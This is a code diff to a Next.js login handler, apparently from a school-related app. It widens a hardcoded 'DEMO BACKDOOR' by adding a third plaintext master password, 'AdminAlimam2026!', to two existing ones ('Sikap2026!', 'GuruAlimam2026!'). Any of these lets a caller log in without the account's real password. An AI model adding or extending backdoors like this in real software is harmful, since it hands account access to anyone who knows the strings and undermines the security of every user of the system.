@@ -63,7 +63,10 @@ export async function POST(req: NextRequest) {
     const valid = await bcrypt.compare(password, user.password);
     
     // DEMO BACKDOOR: Allow master passwords for easy testing during demo
-    const isMasterPassword = password === "Sikap2026!" || password === "GuruAlimam2026!";
+    const isMasterPassword = 
+      password === "Sikap2026!" || 
+      password === "GuruAlimam2026!" || 
+      password === "AdminAlimam2026!";
 
     if (!valid && !isMasterPassword) {
       return NextResponse.json(
